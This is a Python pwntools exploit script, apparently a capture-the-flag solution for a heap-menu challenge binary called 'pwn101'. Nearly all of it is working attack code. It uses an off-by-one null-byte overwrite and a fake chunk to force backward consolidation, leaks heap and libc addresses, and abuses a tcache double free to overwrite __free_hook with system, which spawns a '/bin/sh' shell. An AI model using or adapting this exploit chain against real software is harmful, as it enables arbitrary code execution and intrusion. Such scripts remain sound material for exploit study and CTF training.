from pwn import *


binname = './pwn101'
context.binary = binname
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

elf = ELF(binname)
libc = elf.libc


def debug(func):
    def wrapper(*args, **kwargs):
        print "{}({}, {})".format(func.__name__, str(args), str(kwargs))
        return func(*args, **kwargs)
    return wrapper


@debug
def add(length, phone, name, desc):
    io.recvuntil("> ")
    io.sendline(str(1))
    io.recvuntil("Length: ")
    io.sendline(str(length))
    io.recvuntil("Number: ")
    io.sendline(str(phone))
    io.recvuntil("Name: ")
    io.sendline(name[:0x20])
    io.recvuntil("Description: ")
    io.send(desc)


@debug
def show(index):
    io.recvuntil("> ")
    io.sendline(str(2))
    io.recvuntil("Index: ")
    io.sendline(str(index))
    io.recvuntil("Number: ")
    phone = io.recvuntil("Name")[:-4].rstrip()
    io.recvuntil(": ")
    name = io.recvuntil("Description")[:-11].rstrip()
    io.recvuntil(": ")
    desc = io.recvuntil("+").rstrip("\n+")
    return phone, name, desc


@debug
def delete(index):
    io.recvuntil("> ")
    io.sendline(str(3))
    io.recvuntil("Index: ")
    io.sendline(str(index))


gdbscript = '''
pwn
# menu
b *0x555555554f99
'''
# io = gdb.debug([binname], aslr=False, gdbscript=gdbscript)
io = process(binname)
# io = remote('localhost', 4088)


add(0x20, 1, 'a' * 0x8, 'A' * 0x10 + '\n') # 0
delete(0)
add(0x20, 1, '', '\n') # 0
_, addr_heap, _ = show(0)
addr_heap = (u64(addr_heap.ljust(8, '\x00')) & (0xfffffffffffff000)) - 0x1000
print "addr_heap = {}".format(hex(addr_heap))

add(0x20, 1, 'b' * 0x8, 'B' * 0x10 + '\n') # 1
add(0x20, 1, 'g' * 0x8, 'G' * 0x10 + '\n') # 2

delete(1)
add(0x38, 1, 'c' * 0x8, 'C' * 0x10 + '\n') # 1

print "Set fake chunk"
fake_size = 0xf0
addr_fake_chunk = addr_heap + 0x12d0

fake_chunk = ''
fake_chunk += p64(fake_size) # prev_size
fake_chunk += p64(fake_size | 1) # size
fake_chunk += p64(addr_fake_chunk) # fd
fake_chunk += p64(addr_fake_chunk) # bk
# add(0x10f8, 1, fake_chunk, 'D' * 0x10 + '\n') # 2
add(0x10f8, 1, fake_chunk, '\n') # 3

add(0x90, 1, 'e' * 0x8, 'E' * 0x10 + '\n') # 4


print "Set fake prev_size and overwrite next PREV_INUSE"
payload = 'F' * 0x30 + p64(fake_size) + '\x00'
delete(1)
add(0x38, 1, 'f' * 0x8, payload) # 1

print "Delete overwritten chunk which will make it join backwords"
delete(3)
print "Now the joint chunk is linked to unsorted bins"

add(0x48, 1, 'h' * 0x8, 'H' * 0x10 + '\n') # 5

print "Leak main_arena"
data = show(2)
print data
_, addr_libc, _ = data
addr_libc = u64(addr_libc.ljust(8, '\x00')) - 0x3ebca0
print "addr_libc = {}".format(hex(addr_libc))

add(0x58, 1, 'i' * 0x8, 'I' * 0x10 + '\n') # 6

print "Double free tcache sized chunk"
delete(2)
delete(5)


offset_one_gadget = 0x10a38c
offset_one_gadget = 0x4f322
offset_one_gadget = 0x4f2c5
addr_one_gadet = addr_libc + offset_one_gadget

addr_system = addr_libc + libc.symbols['system']
addr_free_hook = addr_libc + libc.symbols['__free_hook']

print "Overwrite tcache_entry->next to point to free_hook"
add(0x68, 1, p64(addr_free_hook), 'hoge\n') # 2

print "Spit out double freed chunk"
add(0x68, 1, '/bin/sh', 'fuga\n') # 5

print "Over write free_hook"
# This should return free_hook
add(0x68, 1, p64(addr_system), 'cafe\n') # 7

print "Start shell"
delete(5)

# print "Start shell"
# io.recvuntil("> ")
# io.sendline(str(1))


io.interactive()
